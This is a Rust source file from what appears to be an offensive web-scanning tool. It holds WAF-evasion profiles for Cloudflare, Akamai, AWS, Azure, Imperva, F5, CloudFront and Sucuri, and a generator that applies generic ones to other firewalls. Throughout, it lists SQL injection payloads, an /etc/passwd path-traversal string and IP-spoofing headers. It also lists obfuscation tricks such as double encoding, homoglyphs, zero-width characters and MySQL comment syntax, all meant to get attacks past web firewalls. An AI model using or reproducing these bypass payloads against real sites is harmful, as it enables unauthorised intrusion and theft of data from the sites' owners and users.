use crate::waf::bypass::BypassTechnique;
use crate::waf::data::get_waf_signatures;
use rustc_hash::FxHashMap;
use rustc_hash::FxHashSet;
use serde::{Deserialize, Serialize};
use std::sync::LazyLock;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WafProfile {
    pub name: String,
    pub bypasses: Vec<ProfileBypass>,
    pub detection_signatures: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProfileBypass {
    pub technique: BypassTechnique,
    pub headers: Vec<(String, String)>,
    pub payloads: Vec<String>,
    pub description: String,
}

static WAF_PROFILES: LazyLock<Vec<WafProfile>> = LazyLock::new(|| {
    let mut profiles = vec![
        get_cloudflare_profile(),
        get_akamai_profile(),
        get_aws_waf_profile(),
        get_azure_waf_profile(),
        get_imperva_profile(),
        get_f5_asm_profile(),
        get_cloudfront_profile(),
        get_sucuri_profile(),
    ];

    profiles.extend(get_generated_profiles(&profiles));
    profiles
});

static SIGNATURE_TO_PROFILE: LazyLock<FxHashMap<String, &'static WafProfile>> =
    LazyLock::new(|| {
        let mut map = FxHashMap::with_capacity_and_hasher(100, Default::default());
        for profile in get_waf_profiles().iter() {
            for sig in &profile.detection_signatures {
                map.insert(sig.to_lowercase(), profile);
            }
        }
        map
    });

pub fn get_waf_profiles() -> &'static Vec<WafProfile> {
    &WAF_PROFILES
}

pub fn get_profile_by_detection_sig(sig: &str) -> Option<&'static WafProfile> {
    SIGNATURE_TO_PROFILE.get(&sig.to_lowercase()).copied()
}

pub fn get_profile_by_name(name: &str) -> Option<WafProfile> {
    let name_lower = name.to_lowercase();
    get_waf_profiles()
        .iter()
        .find(|p| p.name.to_lowercase() == name_lower)
        .cloned()
}

fn get_cloudflare_profile() -> WafProfile {
    WafProfile {
        name: "Cloudflare".to_string(),
        detection_signatures: vec![
            "cf-ray".to_string(),
            "cf-cache-status".to_string(),
            "cloudflare".to_string(),
            "__cfduid".to_string(),
        ],
        bypasses: vec![
            ProfileBypass {
                technique: BypassTechnique::HeaderManipulation,
                headers: vec![
                    ("CF-Connecting-IP".to_string(), "127.0.0.1".to_string()),
                    ("True-Client-IP".to_string(), "127.0.0.1".to_string()),
                    ("X-Real-IP".to_string(), "127.0.0.1".to_string()),
                ],
                payloads: vec![],
                description: "Cloudflare IP spoofing".to_string(),
            },
            ProfileBypass {
                technique: BypassTechnique::UserAgentRotation,
                headers: vec![("User-Agent".to_string(), "curl/7.68.0".to_string())],
                payloads: vec![],
                description: "Use curl user agent".to_string(),
            },
            ProfileBypass {
                technique: BypassTechnique::EncodingBypass,
                headers: vec![("Accept-Encoding".to_string(), "gzip, deflate".to_string())],
                payloads: vec![
                    "' OR 1=1--".to_string(),
                    "1 AND 1=1".to_string(),
                    "admin'--".to_string(),
                ],
                description: "Standard encoding bypass".to_string(),
            },
            ProfileBypass {
                technique: BypassTechnique::CommentObfuscation,
                headers: vec![],
                payloads: vec![
                    "1'/**/AND/**/1=1--".to_string(),
                    "admin'/**/--".to_string(),
                    "1'/*!50000AND*/1=1--".to_string(),
                ],
                description: "Comment obfuscation - Cloudflare specific".to_string(),
            },
            ProfileBypass {
                technique: BypassTechnique::CaseRotation,
                headers: vec![],
                payloads: vec!["' uNiOn SeLeCt NULL--".to_string(), "1 AnD 1=1".to_string()],
                description: "Case rotation bypass".to_string(),
            },
            ProfileBypass {
                technique: BypassTechnique::ContentTypeBypass,
                headers: vec![(
                    "Content-Type".to_string(),
                    "application/x-www-form-urlencoded".to_string(),
                )],
                payloads: vec![],
                description: "Content-Type variation".to_string(),
            },
        ],
    }
}

fn get_akamai_profile() -> WafProfile {
    WafProfile {
        name: "Akamai".to_string(),
        detection_signatures: vec![
            "akamai".to_string(),
            "x-akamai-transformed".to_string(),
            "akamaiedge".to_string(),
        ],
        bypasses: vec![
            ProfileBypass {
                technique: BypassTechnique::HeaderManipulation,
                headers: vec![
                    ("Pragma".to_string(), "akamai-x-get-cache-key".to_string()),
                    ("X-Akamai-Transform".to_string(), "1".to_string()),
                ],
                payloads: vec![],
                description: "Akamai specific headers".to_string(),
            },
            ProfileBypass {
                technique: BypassTechnique::EncodingBypass,
                headers: vec![("Accept-Encoding".to_string(), "gzip".to_string())],
                payloads: vec!["' OR 1=1--".to_string(), "../../../etc/passwd".to_string()],
                description: "Encoding bypass".to_string(),
            },
            ProfileBypass {
                technique: BypassTechnique::Homoglyph,
                headers: vec![],
                payloads: vec!["' ОR 1=1--".to_string(), "admіn'--".to_string()],
                description: "Homoglyph bypass for Akamai".to_string(),
            },
            ProfileBypass {
                technique: BypassTechnique::DoubleEncoding,
                headers: vec![],
                payloads: vec!["%2527".to_string(), "%252e%252e%252f".to_string()],
                description: "Double URL encoding".to_string(),
            },
        ],
    }
}

fn get_aws_waf_profile() -> WafProfile {
    WafProfile {
        name: "AWS WAF".to_string(),
        detection_signatures: vec![
            "awselb".to_string(),
            "x-amzn-requestid".to_string(),
            "x-amz-cf-id".to_string(),
        ],
        bypasses: vec![
            ProfileBypass {
                technique: BypassTechnique::HeaderManipulation,
                headers: vec![
                    (
                        "X-Amzn-Trace-Id".to_string(),
                        "Root=1-00000000-000000000000000000000000".to_string(),
                    ),
                    ("AWS-LB".to_string(), "true".to_string()),
                ],
                payloads: vec![],
                description: "AWS-specific headers".to_string(),
            },
            ProfileBypass {
                technique: BypassTechnique::EncodingBypass,
                headers: vec![],
                payloads: vec!["+AND+1=1--".to_string(), "%27%20OR%201%3D1--".to_string()],
                description: "AWS WAF URL encoding bypass".to_string(),
            },
            ProfileBypass {
                technique: BypassTechnique::WhitespaceVariation,
                headers: vec![],
                payloads: vec![
                    "1'\u{00A0}OR\u{00A0}1=1--".to_string(),
                    "1\u{2000}AND\u{2001}1=1".to_string(),
                ],
                description: "Unicode whitespace variation".to_string(),
            },
        ],
    }
}

fn get_azure_waf_profile() -> WafProfile {
    WafProfile {
        name: "Azure WAF".to_string(),
        detection_signatures: vec![
            "x-azure-ref".to_string(),
            "x-azure-origin".to_string(),
            "microsoft-azure".to_string(),
        ],
        bypasses: vec![
            ProfileBypass {
                technique: BypassTechnique::HeaderManipulation,
                headers: vec![
                    (
                        "X-Azure-RequestId".to_string(),
                        "00000000-0000-0000-0000-000000000000".to_string(),
                    ),
                    (
                        "X-MS-RequestId".to_string(),
                        "00000000-0000-0000-0000-000000000000".to_string(),
                    ),
                ],
                payloads: vec![],
                description: "Azure request ID headers".to_string(),
            },
            ProfileBypass {
                technique: BypassTechnique::EncodingBypass,
                headers: vec![],
                payloads: vec!["'%09OR%091=1--".to_string(), "1%0AOR%0A1=1--".to_string()],
                description: "Tab/newline encoding".to_string(),
            },
        ],
    }
}

fn get_imperva_profile() -> WafProfile {
    WafProfile {
        name: "Imperva".to_string(),
        detection_signatures: vec![
            "x-cdn".to_string(),
            "x-iinfo".to_string(),
            "incapsula".to_string(),
            "__cfduid".to_string(),
        ],
        bypasses: vec![
            ProfileBypass {
                technique: BypassTechnique::HeaderManipulation,
                headers: vec![
                    ("X-CDN".to_string(), "1".to_string()),
                    ("X-Forwarded-For".to_string(), "127.0.0.1".to_string()),
                ],
                payloads: vec![],
                description: "Imperva CDN headers".to_string(),
            },
            ProfileBypass {
                technique: BypassTechnique::CommentObfuscation,
                headers: vec![],
                payloads: vec![
                    "1'/*!12345AND*/1=1--".to_string(),
                    "admin'/*!50000--*/".to_string(),
                    "1'/*!50000UNION*/SELECT*/1,2--".to_string(),
                ],
                description: "MySQL version comment bypass".to_string(),
            },
            ProfileBypass {
                technique: BypassTechnique::UnicodeEncoding,
                headers: vec![],
                payloads: vec!["\u{0027}\u{004f}\u{0052}\u{0031}\u{003d}\u{0031}".to_string()],
                description: "Unicode encoding for quotes".to_string(),
            },
            ProfileBypass {
                technique: BypassTechnique::ZeroWidthInjection,
                headers: vec![],
                payloads: vec!["1\u{200b}OR\u{200b}1=1".to_string()],
                description: "Zero-width character injection".to_string(),
            },
        ],
    }
}

fn get_f5_asm_profile() -> WafProfile {
    WafProfile {
        name: "F5 ASM".to_string(),
        detection_signatures: vec![
            "bigip".to_string(),
            "X-Correlation-Id".to_string(),
            "TS".to_string(),
        ],
        bypasses: vec![
            ProfileBypass {
                technique: BypassTechnique::HeaderManipulation,
                headers: vec![
                    ("X-F5-BIGIP".to_string(), "true".to_string()),
                    ("X-F5-Traffic".to_string(), "1".to_string()),
                ],
                payloads: vec![],
                description: "F5 specific headers".to_string(),
            },
            ProfileBypass {
                technique: BypassTechnique::EncodingBypass,
                headers: vec![],
                payloads: vec![
                    "'%20OR%20'1'='1".to_string(),
                    "1%27AND%271%27=%271".to_string(),
                ],
                description: "Mixed encoding bypass".to_string(),
            },
            ProfileBypass {
                technique: BypassTechnique::CaseRotation,
                headers: vec![],
                payloads: vec!["uNiOn SeLeCt".to_string(), "sElEcT * fRoM".to_string()],
                description: "Case variation for SQL keywords".to_string(),
            },
        ],
    }
}

fn get_cloudfront_profile() -> WafProfile {
    WafProfile {
        name: "CloudFront".to_string(),
        detection_signatures: vec![
            "cloudfront".to_string(),
            "x-amz-cf-pop".to_string(),
            "x-cache".to_string(),
        ],
        bypasses: vec![
            ProfileBypass {
                technique: BypassTechnique::HeaderManipulation,
                headers: vec![
                    ("X-Amz-Cf-Id".to_string(), "test".to_string()),
                    ("Via".to_string(), "1.1 cloudfront".to_string()),
                ],
                payloads: vec![],
                description: "CloudFront headers".to_string(),
            },
            ProfileBypass {
                technique: BypassTechnique::EncodingBypass,
                headers: vec![],
                payloads: vec!["%2527".to_string(), "1%2527AND%25271%253D1".to_string()],
                description: "Double encoding for CloudFront".to_string(),
            },
        ],
    }
}

fn get_sucuri_profile() -> WafProfile {
    WafProfile {
        name: "Sucuri".to_string(),
        detection_signatures: vec![
            "sucuri".to_string(),
            "x-sucuri".to_string(),
            "x-sucuri-id".to_string(),
            "x-sucuri-cache".to_string(),
        ],
        bypasses: vec![
            ProfileBypass {
                technique: BypassTechnique::HeaderManipulation,
                headers: vec![
                    ("X-Sucuri-ID".to_string(), "test".to_string()),
                    ("X-Sucuri-Cache".to_string(), "HIT".to_string()),
                ],
                payloads: vec![],
                description: "Sucuri headers".to_string(),
            },
            ProfileBypass {
                technique: BypassTechnique::EncodingBypass,
                headers: vec![],
                payloads: vec!["' OR 1=1 #".to_string(), "1 OR 1=1 #".to_string()],
                description: "Hash comment bypass".to_string(),
            },
        ],
    }
}

pub fn get_auto_profile() -> WafProfile {
    WafProfile {
        name: "Auto-Detect".to_string(),
        detection_signatures: vec![],
        bypasses: vec![
            ProfileBypass {
                technique: BypassTechnique::UserAgentRotation,
                headers: vec![(
                    "User-Agent".to_string(),
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36".to_string(),
                )],
                payloads: vec![],
                description: "Standard browser UA".to_string(),
            },
            ProfileBypass {
                technique: BypassTechnique::XForwardedForSpoof,
                headers: vec![
                    ("X-Forwarded-For".to_string(), "127.0.0.1".to_string()),
                    ("X-Real-IP".to_string(), "127.0.0.1".to_string()),
                ],
                payloads: vec![],
                description: "IP spoofing".to_string(),
            },
            ProfileBypass {
                technique: BypassTechnique::CommentObfuscation,
                headers: vec![],
                payloads: vec!["1'/**/OR/**/1=1--".to_string(), "admin'/**/--".to_string()],
                description: "Inline comment bypass".to_string(),
            },
            ProfileBypass {
                technique: BypassTechnique::CaseRotation,
                headers: vec![],
                payloads: vec!["' uNiOn SeLeCt NULL--".to_string()],
                description: "Case rotation".to_string(),
            },
            ProfileBypass {
                technique: BypassTechnique::Homoglyph,
                headers: vec![],
                payloads: vec!["' ОR 1=1--".to_string()],
                description: "Homoglyph bypass".to_string(),
            },
            ProfileBypass {
                technique: BypassTechnique::DoubleEncoding,
                headers: vec![],
                payloads: vec!["%2527".to_string()],
                description: "Double URL encoding".to_string(),
            },
            ProfileBypass {
                technique: BypassTechnique::WhitespaceVariation,
                headers: vec![],
                payloads: vec!["1'\u{00A0}OR\u{00A0}1=1".to_string()],
                description: "Unicode whitespace".to_string(),
            },
            ProfileBypass {
                technique: BypassTechnique::ZeroWidthInjection,
                headers: vec![],
                payloads: vec!["1\u{200b}OR\u{200b}1=1".to_string()],
                description: "Zero-width injection".to_string(),
            },
        ],
    }
}

fn get_generated_profiles(existing_profiles: &[WafProfile]) -> Vec<WafProfile> {
    let existing_names: FxHashSet<String> = existing_profiles
        .iter()
        .map(|p| p.name.to_lowercase())
        .collect();

    let mut generated = Vec::new();
    for signature in get_waf_signatures().values() {
        let waf_name = signature.name.trim();
        if waf_name.is_empty() || existing_names.contains(&waf_name.to_lowercase()) {
            continue;
        }
        generated.push(build_generic_profile_for_waf(waf_name, &signature.headers));
    }

    generated
}

fn build_generic_profile_for_waf(name: &str, headers: &[String]) -> WafProfile {
    let mut header_bypass_set = vec![
        ("X-Forwarded-For".to_string(), "127.0.0.1".to_string()),
        ("X-Real-IP".to_string(), "127.0.0.1".to_string()),
        ("X-Originating-IP".to_string(), "127.0.0.1".to_string()),
    ];

    if let Some(marker) = headers.first() {
        header_bypass_set.push(("X-WAF-Marker".to_string(), marker.clone()));
    }

    WafProfile {
        name: name.to_string(),
        detection_signatures: headers.iter().take(4).cloned().collect(),
        bypasses: vec![
            ProfileBypass {
                technique: BypassTechnique::HeaderManipulation,
                headers: header_bypass_set,
                payloads: vec![],
                description: format!("Generic {} header bypass set", name),
            },
            ProfileBypass {
                technique: BypassTechnique::UserAgentRotation,
                headers: vec![(
                    "User-Agent".to_string(),
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36".to_string(),
                )],
                payloads: vec![],
                description: format!("Generic {} browser user-agent", name),
            },
            ProfileBypass {
                technique: BypassTechnique::DoubleEncoding,
                headers: vec![],
                payloads: vec![
                    "%2527%2520OR%25201%253D1--".to_string(),
                    "%252e%252e%252fetc%252fpasswd".to_string(),
                ],
                description: format!("Generic {} double encoding payloads", name),
            },
            ProfileBypass {
                technique: BypassTechnique::CommentObfuscation,
                headers: vec![],
                payloads: vec!["1'/**/OR/**/1=1--".to_string()],
                description: format!("Generic {} comment obfuscation payload", name),
            },
        ],
    }
}
